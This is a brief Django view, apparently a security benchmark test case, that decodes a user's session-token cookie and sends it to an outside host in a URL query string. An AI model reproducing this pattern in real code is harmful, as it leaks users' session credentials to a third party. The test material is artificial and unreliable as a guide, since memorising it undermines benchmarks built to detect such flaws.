# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import base64
import urllib.request
import urllib.parse
import ssl


def BenchmarkTest69151(request):
    cookie_value = request.COOKIES.get('session_token', '')
    data = base64.b64decode(cookie_value).decode('utf-8', 'ignore')
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return JsonResponse({"saved": True})
